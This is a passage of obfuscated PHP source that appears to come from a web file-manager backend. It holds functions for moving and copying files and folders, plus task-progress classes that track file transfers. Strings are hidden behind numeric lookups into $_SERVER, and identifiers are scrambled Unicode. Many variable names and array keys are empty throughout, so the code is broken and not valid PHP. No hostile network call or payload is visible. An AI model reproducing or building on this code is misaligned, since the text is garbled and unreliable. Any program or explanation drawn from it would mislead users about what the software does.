$this->parentLevelArray($); $ = $χ[count($χ) - 1]; return array($ռ[190] => $, $ռ[604] => $); } private function _makeItemData($׺, $, $) { $׼ =& $_SERVER[]; $ = array($׼[668] => $׺[$׼[500]], $׼[509] => $, $׼[669] => $׺[$׼[501]] ? $׺[$׼[501]] : $׼[12], $׼[558] => $׺[$׼[557]] ? $׺[$׼[557]] : 0, $׼[640] => $׺[$׼[79]] ? $׺[$׼[79]] : 0, $׼[670] => intval($[$׼[188]]), $׼[671] => intval($[$׼[589]]), $׼[672] => intval(USER_ID), $׼[673] => intval(USER_ID), $׼[492] => intval($[$׼[191]]), $׼[674] => $[$׼[604]] . $[$׼[191]] . $׼[50], $׼[513] => $׺[$׼[88]] ? $׺[$׼[88]] : time(), $׼[519] => 0, $׼[675] => $׼[12]); return $; } private function _copyApplyMeta($ք, &$) { $̽ =& $_SERVER[]; $׼ = $ք[$̽[191]]; $ = $ք[$̽[32]]; if (!isset($ք[$̽[676]]) || !$ք[$̽[676]] || $ք[$̽[676]] == $̽[228]) { $[$̽[654]][] = array($̽[191], $׼, $̽[676], short_id($׼)); } if (Input::check($, $̽[677])) { $[$̽[653]][] = array($̽[191] => $׼, $̽[95] => $̽[552], $̽[451] => str_replace($̽[53], $̽[12], Pinyin::get($))); $[$̽[653]][] = array($̽[191] => $׼, $̽[95] => $̽[551], $̽[451] => Pinyin::get($, $̽[678])); } $[$̽[653]][] = array($̽[191] => $׼, $̽[95] => $̽[531], $̽[451] => KodSort::makeStr($)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($չ栔) { $㓖 =& $_SERVER[]; $ژǚ = $this->sourceInfo($չ栔); $ׂ = $㓖[679]; $ؓ = array($㓖[604] => array($㓖[635], $ژǚ[$㓖[604]] . $չ栔 . $㓖[636]), $㓖[520] => $this->targetIsDelete); $܍َ = $this->field($ׂ)->where($ؓ)->select(); if (!$܍َ) { return; } $܍َ = array_to_keyvalue($܍َ, $㓖[191]); foreach ($܍َ as $窎) { $ = $窎[$㓖[190]]; $չ栔 = $窎[$㓖[191]]; if (!isset($this->_childrenListCache[$չ栔]) && $窎[$㓖[500]] == $㓖[91]) { $this->_childrenListCache[$չ栔] = array(); } if (!isset($this->_childrenListCache[$])) { $this->_childrenListCache[$] = array(); } $this->_childrenListCache[$][$չ栔] = $窎; $this->_childrenItemCache[$չ栔] = $窎; } } private function _childrenListAll($, &$՚) { $䟀 =& $_SERVER[]; if (!isset($this->_childrenListCache[$])) { return; } $ = $this->_childrenListCache[$]; foreach ($ as $ => $) { $՚[$] = $; if ($[$䟀[500]] == $䟀[91]) { $this->_childrenListAll($, $՚); } } } private function sourceInfoCache($܂) { if (isset($this->_childrenItemCache[$܂])) { return $this->_childrenItemCache[$܂]; } return $this->sourceInfo($܂); } private function _childrenList($Ľ) { if (isset($this->_childrenListCache[$Ľ])) { return $this->_childrenListCache[$Ľ]; } return $this->_childrenListSelect($Ľ); } private function _childrenListSelect($Ȋ) { $ =& $_SERVER[]; $ۺ = array($[190] => $Ȋ, $[520] => $this->targetIsDelete); $լ = $this->where($ۺ)->select(); $լ = $լ ? $լ : array(); $ = array_to_keyvalue($լ, $[191]); $this->_childrenListCache[$Ȋ] = $; foreach ($ as $Ȋ => $) { $this->_childrenItemCache[$Ȋ] = $; } return $; } private function fileNameExistAuto($ȏ, $) { $ =& $_SERVER[]; if ($[$[520]] == $[91]) { return $this->fileNameExist($ȏ, $[$[32]]); } return $this->fileNameExistCache($ȏ, $[$[32]]); } private function fileNameExistCache($롗, $ꢵ) { $޸Ֆ =& $_SERVER[]; $ꢵ = strtolower($ꢵ); $˺柶 = $this->_childrenList($롗); foreach ($˺柶 as $) { if ($ꢵ == strtolower($[$޸Ֆ[32]])) { return $[$޸Ֆ[191]]; } } return !1; } private function fileNameAutoCache($, $, $ج, $ռ) { $ө =& $_SERVER[]; $ = $this->_childrenList($); $ź = array_to_keyvalue($, $ө[12], $ө[32]); return $this->fileNameAutoGet($ź, $, $ج, $ռ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($, $ֆ, $ҏ = REPEAT_REPLACE, $͕ = '') { $ =& $_SERVER[]; $ś = $this->sourceInfo($); $ͱ = $this->sourceInfo($ֆ); if ($ś[$[190]] == $ͱ[$[191]]) { if ($ś[$[520]] == $[91]) { Model($[518])->restore(array($)); } if (!$͕ || $͕ == $ś[$[32]]) { return $; } } $ = $this->pathInfoMore($); if ($this->isParentOf($, $ֆ)) { return !1; } if (!$ś || !$ͱ || $ͱ[$[500]] != $[91]) { return !1; } Hook::trigger($[680], $); $this->targetIsDelete = intval($ś[$[520]]); if ($ś[$[190]] == $ֆ && $͕ != $ś[$[32]]) { $ = $this->fileNameExist($ֆ, $͕); if ($ && $ś[$[500]] == $[228]) { $ۚв = $this->sourceInfo($); $ = $this->fileHistory($ۚв, $ś[$[557]], $ś[$[79]]); if (!$) { Model($[560])->remove($ś[$[557]]); } $this->removeNow($, !1); $this->folderSizeReset($ֆ); Hook::trigger($[681], $); return $; } } $ͮɘ = $͕ ? $͕ : $ś[$[32]]; $this->lockMoveStart($); $this->lockWriteStart($ֆ, $ͮɘ); $Ԑ = array($[652] => array(), $[682] => !1); $this->clearShare($, $ֆ); $ = $this->fileNameExistAuto($ֆ, $ś); $ݹ = $this->_move($, $ֆ, $ҏ, $Ԑ, $͕); $this->sourceCacheClear(); if ($ś[$[500]] == $[91] && $) { $this->folderSizeResetChildren($ݹ); } Model($[230])->linkAdd($Ԑ[$[652]]); if ($ݹ && $ && $Ԑ[$[682]]) { $ۆا = $ś[$[500]] == $[91] ? $this->_childrenListSelect($) : !1; $ġڈ = $ۆا && count($ۆا) > 0 ? !0 : !1; $this->removeNow($, $ġڈ); } $this->lockMoveEnd($); $this->lockWriteEnd($ֆ, $ͮɘ); $this->folderSizeReset($ś[$[190]]); $this->folderSizeReset($ֆ); $ = array($ś[$[190]], $ֆ); if ($ś[$[500]] == $[91]) { $[] = $; } $this->updateModifyTime($); Model($[655])->eventMove($, $ś[$[190]], $ֆ); Hook::trigger($[681], $); return $ݹ; } private function _move($, $, $, &$ܽ, $閙 = '') { $Ο =& $_SERVER[]; $̗ = $this->sourceInfo($); $ = $̗[$Ο[500]] == $Ο[91]; $ = $閙 ? $閙 : $̗[$Ο[32]]; $ = $this->fileNameExistAuto($, $̗); $this->lockMoveStart($); $this->lockWriteStart($, $); if (!$) { return $this->_moveForce($, $, $); } $𢙠 = $; $񗞬 = !1; if ($) { if ($ == REPEAT_RENAME_FOLDER) { $ = $this->fileNameAuto($, $, $, $); $𢙠 = $this->_moveForce($, $, $); } else { $㸡 = $this->_childrenListSelect($); foreach ($㸡 as $慢) { $ = REPEAT_REPLACE; $this->_move($慢[$Ο[191]], $, $, $ܽ); } $񗞬 = !0; } } else { if ($ == REPEAT_RENAME || $ == REPEAT_RENAME_FOLDER) { $ = $this->fileNameAuto($, $, $, $); $𢙠 = $this->_moveForce($, $, $); } else { $񘰉 = $this->sourceInfoCache($); $亁 = $this->fileHistory($񘰉, $̗[$Ο[557]], $̗[$Ο[79]]); if ($亁) { $ܽ[$Ο[652]][] = $̗[$Ο[557]]; } $񗞬 = !0; } } if ($񗞬) { $ܽ[$Ο[682]] = !0; } return $𢙠; } private function _moveForce($ְ, $ڬ, $͟) { $Ɋ =& $_SERVER[]; $ = $this->sourceInfo($ְ); $䒱 = $this->sourceInfo($ڬ); $㋚ = $[$Ɋ[500]] == $Ɋ[91]; $ٚ = array($Ɋ[492] => $䒱[$Ɋ[191]], $Ɋ[674] => $䒱[$Ɋ[604]] . $䒱[$Ɋ[191]] . $Ɋ[50], $Ɋ[670] => $䒱[$Ɋ[188]], $Ɋ[671] => $䒱[$Ɋ[589]], $Ɋ[673] => USER_ID, $Ɋ[509] => $͟); $ۏ = $[$Ɋ[188]] == SourceModel::TYPE_GROUP && $䒱[$Ɋ[188]] == SourceModel::TYPE_GROUP && $[$Ɋ[589]] == $䒱[$Ɋ[589]]; if (!$ۏ && $this->moveClearAuth) { Model($Ɋ[587])->authClear($ְ); } $νņ = $[$Ɋ[520]] == $Ɋ[91] && $䒱[$Ɋ[520]] != $Ɋ[91]; if ($νņ) { $ٚ[$Ɋ[519]] = 0; } if ($㋚) { $Э = array($Ɋ[674] => array($Ɋ[635], $[$Ɋ[604]] . $[$Ɋ[191]] . $Ɋ[636])); $Ü = $[$Ɋ[604]] . $[$Ɋ[191]] . $Ɋ[50]; $ = $䒱[$Ɋ[604]] . $䒱[$Ɋ[191]] . $Ɋ[50] . $[$Ɋ[191]] . $Ɋ[50]; $ = array($Ɋ[674] => array($Ɋ[683], "\162\x65\160\154\141\x63\x65\x28\160\x61\162\x65\156\x74\114\145\x76\x65\x6c\x2c\x27{$Ü}\x27\x2c\47{$}\x27\x29"), $Ɋ[670] => $䒱[$Ɋ[188]], $Ɋ[671] => $䒱[$Ɋ[589]]); if ($νņ) { $[$Ɋ[519]] = 0; } $this->where($Э)->data($)->save(); } $this->where(array($Ɋ[506] => $ְ))->data($ٚ)->save(); return $ְ; } private function clearShare($ڵ, $қ) { $붗 =& $_SERVER[]; $： = $this->sourceInfo($ڵ); $ = $this->sourceInfo($қ); if ($：[$붗[589]] == $[$붗[589]] && $：[$붗[188]] == $붗[684]) { return; } $ڞ = array($붗[604] => array($붗[635], $：[$붗[604]] . $ڵ . $붗[636])); $Ł = $this->field($붗[506])->where($ڞ)->getField($붗[191], !0); if (!$Ł) { return; } $ڞ = array($붗[191] => array($붗[7], $Ł), $붗[685] => 1); $ = Model($붗[686])->field($붗[687])->where($ڞ)->select(); if (!$) { return; } $ = array_to_keyvalue($, $붗[12], $붗[687]); $ڞ = array($붗[687] => array($붗[7], $)); Model($붗[686])->where($ڞ)->save(array($붗[685] => 0)); Model($붗[688])->where($ڞ)->delete(); } public function copyFolderFromIO($̩, $ӎ, $, $, $, $͞ = false) { $ =& $_SERVER[]; $ۇ = array($[653] => array(), $[654] => array(), $[652] => array(), $[689] => array()); $͈ɗ = $͞ ? $͞ : $̩->pathThis($ӎ); $ = $this->fileNameExist($, $͈ɗ); $ = $this->mkdir($, $͈ɗ, $); if (!$ || $ == REPEAT_RENAME_FOLDER) { $ = !1; } if ($) { $this->_childrenAllMake($); } Hook::trigger($[690]); $ = KodIO::ioFileDriverGet($[498] . $ . $[402]); $this->_copyChildTo($̩, $ӎ, $, $, $ۇ, $, $); Hook::trigger($[691]); if ($) { $this->folderSizeResetChildren($); } $this->_childrenListClear(); Model($[471])->addAll($ۇ[$[653]], array(), !0); Model($[655])->eventCopy($); $this->saveAll($ۇ[$[654]]); Model($[560])->linkAdd($ۇ[$[652]]); Model($[560])->remove($ۇ[$[689]]); $this->folderSizeReset($); $this->updateModifyTime($); return $; } private function _copyChildTo($, $, $, $ً, &$, $, $) { $΂Ŕ =& $_SERVER[]; $̗Ĩ = $this->sourceInfoCache($); $ֆѺ = $->listPath($); $ֆѺ = $ֆѺ ? $ֆѺ : array($΂Ŕ[86] => array(), $΂Ŕ[85] => array()); $ᷤ = array_merge($ֆѺ[$΂Ŕ[86]], $ֆѺ[$΂Ŕ[85]]); $ = $this->_addFiles($, $, $ֆѺ[$΂Ŕ[86]], $); $ = array(); foreach ($ᷤ as &$) { if (isset($[$[$΂Ŕ[32]]])) { $ = $[$[$΂Ŕ[32]]]; } $[$΂Ŕ[500]] = $[$΂Ŕ[33]] == $΂Ŕ[78]; $[$΂Ŕ[501]] = substr(_get($, $΂Ŕ[166], $΂Ŕ[12]), 0, 10); $[$΂Ŕ[79]] = _get($, $΂Ŕ[79], 0); $[$΂Ŕ[557]] = _get($, $΂Ŕ[557], 0); if (!isset($[$΂Ŕ[692]]) && $[$΂Ŕ[557]]) { $[$΂Ŕ[689]][] = $[$΂Ŕ[557]]; } if ($ً) { $Ѯ = $this->fileNameExistCache($, $[$΂Ŕ[32]]); if ($Ѯ) { if ($[$΂Ŕ[500]] || $ً == REPEAT_SKIP) { continue; } if ($ً == REPEAT_REPLACE) { $ = $this->sourceInfoCache($Ѯ); $֫Ώ = $this->fileHistory($, $[$΂Ŕ[557]], $[$΂Ŕ[79]]); if ($֫Ώ) { $[$΂Ŕ[652]][] = $[$΂Ŕ[557]]; } continue; } else { if ($ً == REPEAT_RENAME) { $[$΂Ŕ[32]] = $this->fileNameAutoCache($, $[$΂Ŕ[32]], $ً, !1); } } } } if (!$[$΂Ŕ[500]] && $[$΂Ŕ[557]] == 0) { continue; } if (!$[$΂Ŕ[500]] && $[$΂Ŕ[557]]) { $[$΂Ŕ[652]][] = $[$΂Ŕ[557]]; } $[] = $this->_makeItemData($, $̗Ĩ, $[$΂Ŕ[32]]); } unset($); if (!empty($)) { $this->addAll($); $this->_childrenListSelect($); } $֊ = $this->_childrenList($); $֊ = array_to_keyvalue($֊, $΂Ŕ[32]); foreach ($ᷤ as $) { $ = $֊[$[$΂Ŕ[32]]]; $͔ = $[$΂Ŕ[191]]; $this->_copyApplyMeta($, $); if ($[$΂Ŕ[33]] == $΂Ŕ[78]) { $[$΂Ŕ[87]] = $->getPathInner($[$΂Ŕ[87]]); $this->_copyChildTo($, $[$΂Ŕ[87]], $͔, $ً, $, $, $); } } } private function _addFiles($翸, $αĜЭ, $, $˳) { $ =& $_SERVER[]; if (!$ || count($) == 0) { return array(); } $ܡ = array(); foreach ($ as &$) { Hook::trigger($[693], $); $[$[87]] = $翸->getPathInner($[$[87]]); $ӻ = $翸->hashSimple($[$[87]]); $ߩ = $翸->hashMd5($[$[87]]); if (strlen($ߩ) > 10 && !isset($ܡ[$ߩ])) { $ܡ[$ߩ] = array(); } $[$[694]] = $ӻ; $[$[563]] = $ߩ; $ܡ[$ߩ][] =& $; if (count($ܡ[$ߩ]) > 1) { $[$[692]] = !0; } Hook::trigger($[695], $); } unset($); $쿬ۏ = array($[563] => array($[7], array_keys($ܡ))); $ = Model($[696]); $ = $->where($쿬ۏ)->select(); $ = $ ? $ : array(); foreach ($ as $К) { if (!isset($ܡ[$К[$[563]]])) { continue; } $ܷ = $ܡ[$К[$[563]]]; foreach ($ܷ as &$) { $[$[557]] = $К[$[557]]; $[$[692]] = !0; } unset($); } $ = array(); foreach ($ as $⾐) { Hook::trigger($[697], $⾐); if (isset($⾐[$[692]]) && $⾐[$[692]]) { Hook::trigger($[698], $⾐); continue; } $ = $翸->getPathInner($⾐[$[87]]); $ = $->addFileMake($, $αĜЭ, $⾐[$[79]], $⾐[$[694]], $⾐[$[563]], $⾐[$[32]], $˳); Hook::trigger($[698], $⾐); if (!is_array($)) { continue; } $[] = $; } $->addAll($); $쿬ۏ = array($[563] => array($[7], array_keys($ܡ))); $ = $->where($쿬ۏ)->select(); $ = $ ? $ : array(); foreach ($ as $К) { if (!isset($ܡ[$К[$[563]]])) { continue; } $ =& $ܡ[$К[$[563]]]; foreach ($ as &$) { $[$[557]] = $К[$[557]]; } unset($); } $鰤 = array(); foreach ($ as $܍) { $鰤[$܍[$[32]]] = $܍; } return $鰤; } } define($_SERVER[][699], $_SERVER[][700]); $ekifrxugdp = $_SERVER[][701]; goto A͎; A: class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($, $ŭ = '', $ = 0, $ǡ = '') { $Ɓ =& $_SERVER[]; if (self::get($)) { return; } $this->task = array($Ɓ[487] => $, $Ɓ[1586] => USER_ID, $Ɓ[1859] => $ǡ, $Ɓ[540] => $Ɓ[12], $Ɓ[33] => $ŭ, $Ɓ[1228] => $Ɓ[12], $Ɓ[1226] => $, $Ɓ[1970] => 0, $Ɓ[1971] => 0, $Ɓ[1972] => 0, $Ɓ[1973] => timeFloat(), $Ɓ[1974] => 0, $Ɓ[1975] => 0, $Ɓ[1976] => 0, $Ɓ[1977] => 0, $Ɓ[844] => $Ɓ[933]); $GLOBALS[$Ɓ[1978]] = 1; Hook::bind($Ɓ[1924], array($this, $Ɓ[1979])); Hook::bind($Ɓ[1980], array($this, $Ɓ[1981])); $this->startAfter(); Hook::trigger($Ɓ[1982], $this->task); $this->task[$Ɓ[1975]] = timeFloat(); } public function end($£ = '') { $ =& $_SERVER[]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$[1975]]) { self::valueSet($this->task[$[487]], !1); } $this->isEnd = !0; if ($£) { $this->task[$[540]] = $£; } self::log($[1983] . $this->task[$[487]] . $[1984] . sprintf($[1010], timeFloat() - $this->task[$[1973]]) . $[1985]); Hook::unbind($[1924], array($this, $[1979])); Hook::unbind($[1980], array($this, $[1981])); $this->endAfter(); $٧ = $this->task; $this->task = !1; Hook::trigger($[1986], $٧); } public function update($ = 0, $֭ = false) { $ö =& $_SERVER[]; $鲠 =& $this->task; if (!$鲠) { return; } $鲠[$ö[1970]] += $; $鲠[$ö[1974]] = timeFloat(); if ($鲠[$ö[1226]]) { if ($鲠[$ö[1226]] < $鲠[$ö[1970]]) { $鲠[$ö[1226]] = $鲠[$ö[1970]]; } $ = timeFloat() - $鲠[$ö[1973]] - $鲠[$ö[1976]]; if ($ <= 0) { $ = 0.001; } $鲠[$ö[1971]] = $鲠[$ö[1970]] / $鲠[$ö[1226]]; $鲠[$ö[1972]] = $鲠[$ö[1970]] / $; if ($鲠[$ö[1971]] > 0) { $鲠[$ö[1977]] = $ * (1 - $鲠[$ö[1971]]) / $鲠[$ö[1971]]; } $鲠[$ö[1977]] = $鲠[$ö[1977]] <= 0 ? 0 : $鲠[$ö[1977]]; } $this->updateAfter(); $˽ = 0.2; if (timeFloat() - $鲠[$ö[1975]] < $˽ && !$֭) { return; } $➀ = self::get($鲠[$ö[487]]); $ = $➀[$ö[844]]; if ($ == self::STATYS_KILL) { $ = array($ö[1987] => LNG($ö[1988]), $ö[1396] => !1); Cache::set($ö[1989] . $this->task[$ö[487]], $, 30); $this->onKill(); $this->end(); die; } else { if ($ == self::STATYS_STOP) { $Ť = 2; $➀[$ö[1976]] += $Ť; self::valueSet($鲠[$ö[487]], $➀); sleep($Ť); $this->update(); return; } } $鲠[$ö[844]] = $ ? $ : $鲠[$ö[844]]; $鲠[$ö[1976]] = $➀[$ö[1976]] ? $➀[$ö[1976]] : 0; $鲠[$ö[1975]] = timeFloat(); Hook::trigger($ö[1990], $鲠); self::valueSet($鲠[$ö[487]], $鲠); } public function onKillSet($ƺ, $ɤ = array()) { $this->onKillCall = array($ƺ, $ɤ); } public function onKill() { $蹯 =& $_SERVER[]; self::log($蹯[1983] . $this->task[$蹯[487]] . $蹯[1991]); Hook::trigger($蹯[1992], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Դ) { $ܯ =& $_SERVER[]; Cache::set($ܯ[1989] . $this->task[$ܯ[487]], $Դ, 60); if (!is_array($Դ) || !$Դ[$ܯ[1396]]) { self::log($ܯ[1993] . json_encode($Դ)); } return $Դ; } public static function get($) { $ڟ =& $_SERVER[]; $ڦՁ = self::valueGet($); if (is_array($ڦՁ) && $ڦՁ[$ڟ[1994]]) { $ = ActionApply($ڦՁ[$ڟ[1994]], array($ڦՁ)); $ڦՁ = is_array($) ? $ : $ڦՁ; } return $ڦՁ; } public static function listData() { $ = self::valueGet(); return array_sort_by($, $_SERVER[][1973], !0); } public static function kill($ξ) { return self::changeStatus($ξ, self::STATYS_KILL); } public static function stop($) { return self::changeStatus($, self::STATYS_STOP); } public static function restart($ױ) { return self::changeStatus($ױ, self::STATYS_RUNNING); } public static function killAll() { $ =& $_SERVER[]; $ = self::listData(); foreach ($ as $򥆛) { self::kill($򥆛[$[487]]); } sleep(2); foreach ($ as $򥆛) { self::valueSet($򥆛[$[487]], !1); } } private static function changeStatus($, $) { $ㆷ =& $_SERVER[]; $ܧ = self::valueGet($); if (!$ܧ) { return !1; } $ܧ[$ㆷ[844]] = $; self::valueSet($, $ܧ); self::log($ㆷ[1995] . $ܧ[$ㆷ[487]] . $ㆷ[1996] . $); return !0; } public static function valueGet($ݼ = false) { $ =& $_SERVER[]; if ($ݼ) { $ = Model($[534])->where(array($[95] => $ݼ, $[33] => $[1235]))->find(); return $ ? json_decode($[$[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ = false) { $͊ =& $_SERVER[]; $ᣪ = array($͊[33] => $͊[1235]); if ($) { $ᣪ[$͊[1586]] = $; } $ = Model($͊[534])->where($ᣪ)->select(); $ = $ ? $ : array(); foreach ($ as $¶ => $) { $[$¶] = json_decode($[$͊[451]], !0); } return $; } public static function valueSet($, $) { $߬ =& $_SERVER[]; if (!$) { return Model($߬[534])->where(array($߬[95] => $, $߬[33] => $߬[1235]))->delete(); } $ = json_encode($); if (!$) { ob_start(); var_dump($); $ = ob_get_clean(); self::log($߬[1997] . json_encode_force($)); } if (!$ || !$[$߬[487]]) { return !1; } $ = array($߬[33] => $߬[1235], $߬[1586] => USER_ID, $߬[95] => $, $߬[451] => $); $ = $߬[1998]; CacheLock::lock($); Model($߬[534])->add($, array(), !0); CacheLock::unlock($); } public static function log($Ꝛ) { if (!GLOBAL_DEBUG) { return; } write_log($Ꝛ, $_SERVER[][1999]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ =& $_SERVER[]; $ܼ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($[2000], array($this, $[2001])); Hook::bind($[1407], array($this, $[2002])); Hook::bind($[2003], array($this, $[2004])); Hook::bind($[690], array($this, $[2005])); Hook::bind($[691], array($this, $[2006])); Hook::bind($[697], array($this, $[2007])); Hook::bind($[698], array($this, $[2008])); Hook::bind($[693], array($this, $[2009])); Hook::bind($[695], array($this, $[2010])); Hook::bind($[659], array($this, $[2011])); Hook::bind($[656], array($this, $[2011])); Hook::bind($[661], array($this, $[2011])); Hook::bind($[663], array($this, $[2011])); Hook::bind($[665], array($this, $[2011])); Hook::bind($[2012], array($this, $[2013])); Hook::bind($[681], array($this, $[2014])); $this->sourceModelCopyFlag = !1; Hook::bind($[2015], array($this, $[2016])); Hook::bind($[2017], array($this, $[2018])); Hook::bind($[2019], array($this, $[2020])); $ܼ[$[2021]] = LNG($[2022]); $ܼ[$[2023]] = 0; $ܼ[$[2024]] = 0; $ܼ[$[1228]] = $[12]; $ܼ[$[2025]] = $[12]; $ܼ[$[2026]] = 0; $ܼ[$[2027]] = 0; $ܼ[$[935]] = 0; if (!$ܼ[$[1859]]) { $ܼ[$[1859]] = LNG($[2028]); } } protected function endAfter() { $˗ =& $_SERVER[]; Hook::unbind($˗[2000], array($this, $˗[2001])); Hook::unbind($˗[1407], array($this, $˗[2002])); Hook::unbind($˗[2003], array($this, $˗[2004])); Hook::unbind($˗[690], array($this, $˗[2005])); Hook::unbind($˗[691], array($this, $˗[2006])); Hook::unbind($˗[697], array($this, $˗[2007])); Hook::unbind($˗[698], array($this, $˗[2008])); Hook::unbind($˗[693], array($this, $˗[2009])); Hook::unbind($˗[695], array($this, $˗[2010])); Hook::unbind($˗[659], array($this, $˗[2011])); Hook::unbind($˗[656], array($this, $˗[2011])); Hook::unbind($˗[661], array($this, $˗[2011])); Hook::unbind($˗[663], array($this, $˗[2011])); Hook::unbind($˗[665], array($this, $˗[2011])); Hook::unbind($˗[2012], array($this, $˗[2013])); Hook::unbind($˗[681], array($this, $˗[2014])); Hook::unbind($˗[2015], array($this, $˗[2016])); Hook::unbind($˗[2017], array($this, $˗[2018])); Hook::unbind($˗[2019], array($this, $˗[2020])); } public function copyMoveStart($ɰ, $Ȗ, $, $졌) { $ =& $_SERVER[]; self::log($[2029] . $Ȗ . $[73] . $졌); $ = rtrim(TEMP_FILES, $[8]); if (substr($Ȗ, 0, strlen($)) == $) { return; } if (substr($졌, 0, strlen($)) == $) { return; } $ =& $this->task; $[$[2030]] = KodIO::transferType($ɰ, $); self::log($[2031] . $[$[2030]] . $[74] . $Ȗ . $[73] . $졌); $this->update(); } public function updateAfter() { $ =& $_SERVER[]; $ =& $this->task; if (!$[$[858]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($[$[2030]] == $[1508]) { return; } self::updateTask($); } private static function updateTask(&$̎) { $ =& $_SERVER[]; if ($̎[$[2030]] == $[1379] || $̎[$[2030]] == $[107]) { if ($̎[$[2025]]) { $̎[$[935]] = $̎[$[2027]] + $̎[$[2024]]; } } else { if ($̎[$[2030]] == $[1509]) { if ($̎[$[2025]] == $[1379]) { $̎[$[935]] = $̎[$[2027]] + $̎[$[2024]] * 0.5; } else { if ($̎[$[2025]] == $[107]) { $̎[$[935]] = $̎[$[2027]] + $̎[$[2023]] * 0.5 + $̎[$[2024]] * 0.5; } } } } $̎[$[1971]] = $̎[$[935]] / $̎[$[858]]; if ($̎[$[1971]] > 0) { $ = timeFloat() - $̎[$[1973]] - $̎[$[1976]]; $̎[$[1977]] = $ * (1 - $̎[$[1971]]) / $̎[$[1971]]; } $ё = $̎[$[2024]] . $[986] . $̎[$[2023]] . "\73\40{$ǋ}\x3b" . $̎[$[935]]; self::log($[2032] . $̎[$[2025]] . $[74] . $̎[$[1971]] . $[74] . $ё); } public function addPath($Ң) { $î =& $_SERVER[]; if (!$Ң) { return; } $ڜ =& $this->task; $Γ = IO::infoWithChildren($Ң); $鎙 = $ڜ[$î[2033]] ? $ڜ[$î[2033]][$î[2034]] : 0; $ڜ[$î[2033]] = array($î[2034] => $鎙 + 1, $î[509] => $Γ[$î[32]], $î[87] => $Γ[$î[87]], $î[602] => $Γ[$î[602]] ? $Γ[$î[602]] : $Γ[$î[87]]); if ($Γ[$î[33]] == $î[230]) { $ڜ[$î[1226]] += 1; } else { $ڜ[$î[1226]] += $Γ[$î[82]][$î[80]]; if ($Γ[$î[191]]) { $ڜ[$î[1226]] += $Γ[$î[82]][$î[81]] + 1; } } $ڜ[$î[858]] += $Γ[$î[79]]; $this->update(); self::log(array($î[2035] . $Ң, $Γ)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ܨ) { } public function sourceAddHashEnd($π) { } public function sourceAddFileStart($ޫ) { $ =& $_SERVER[]; $ؕ =& $this->task; $ؕ[$[2023]] = $ޫ[$[79]]; $ؕ[$[2021]] = $ޫ[$[32]]; $ؕ[$[1228]] = $ޫ[$[32]]; $ؕ[$[2036]] = $ޫ[$[87]]; $this->update(); self::log($[2037] . $ޫ[$[87]] . $[2038] . $ޫ[$[79]]); } public function sourceAddFileEnd($) { $ =& $_SERVER[]; $؋ =& $this->task; $؋[$[935]] += $[$[79]]; $؋[$[2036]] = $[$[87]]; $this->update(1); self::log($[2039] . $[$[87]] . $[2038] . $[$[79]] . $[2040]); } public function copyFileStart($Ꝝ, $ڮ, $ւ, $, $֍, $Ә) { $ =& $_SERVER[]; $ = $֍; if ($ == $GLOBALS[$[2041]]) { $ = $GLOBALS[$[2042]]; } $GLOBALS[$[2042]] = $֍; $GLOBALS[$[2041]] = $Ә; $ǈ =& $this->task; $ǈ[$[2021]] = $; $ǈ[$[2023]] = (int) $Ꝝ->size($ڮ); $ǈ[$[2024]] = 0; $ǈ[$[1228]] = $[12]; $ǈ[$[2025]] = $[12]; $ǈ[$[2026]] = 0; $ݚ = $ǈ[$[2023]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ǈ[$[487]] . $[2043]); if ($ݚ && file_exists(get_path_father($))) { Cache::set($ǈ[$[487]] . $[2043], $); $ǈ[$[1994]] = array($[2044], $[2045]); } $this->update(0, $ݚ); self::log("\143\157\x70\171\106\x69\154\145\x53\164\141\x72\x74\x3a{$ڮ}\73"); } public static function updateCopyLocalFileSize($¾á) { $ =& $_SERVER[]; $ = Cache::get($¾á[$[487]] . $[2043]); if (!$ || !file_exists($)) { return $¾á; } $¾á[$[2024]] = @filesize($); $¾á[$[935]] += $¾á[$[2024]]; self::updateTask($¾á); return $¾á; } public function copyFileEnd($ϟ, $¬, $, $ʹ, $, $) { $ =& $_SERVER[]; $Ҧ =& $this->task; $Ҧ[$[2024]] = $Ҧ[$[2023]]; $Ҧ[$[2025]] = $[12]; unset($Ҧ[$[1994]]); if ($ == $Ҧ[$[2021]]) { $Ҧ[$[2027]] += $Ҧ[$[2023]]; $Ҧ[$[935]] = $Ҧ[$[2027]]; $̃ = 1; if (isset($Ҧ[$[2036]]) && $Ҧ[$[2036]] == $¬) { $̃ = 0; } $this->update($̃); } else { $this->update(); $Ҧ[$[2024]] = 0; } Cache::remove($Ҧ[$[487]] . $[2043]); self::log($[2046] . $¬ . $[73] . $ʹ . $[285] . $ . $[2047] . $Ҧ[$[2021]]); } public function updateFileEnd($, $) { $밂 =& $_SERVER[]; $ɒ =& $this->task; $ɒ[$밂[2021]] = $; $ɒ[$밂[2023]] = $; $ɒ[$밂[2027]] += $; $ɒ[$밂[935]] = $ɒ[$밂[2027]]; $this->update(1); self::log($밂[2048] . $); } public function sourceModelCopy($Ψ) { $Α߇ =& $_SERVER[]; $ = $Ψ[0]; $ۭ = $Ψ[1]; $Š =& $this->task; $this->sourceModelCopyFlag = !0; $ = 0; switch ($) { case $Α߇[657]: $ = 1; break; case $Α߇[660]: $Š[$Α߇[2021]] = $ۭ[$Α߇[32]]; break; case $Α߇[662]: $ = intval($Ψ[$Α߇[467]] * 0.4); break; case $Α߇[664]: $ = intval($Ψ[$Α߇[467]] * 0.2); break; case $Α߇[666]: $ = intval($Ψ[$Α߇[467]] * 0.4); break; } $this->update($); 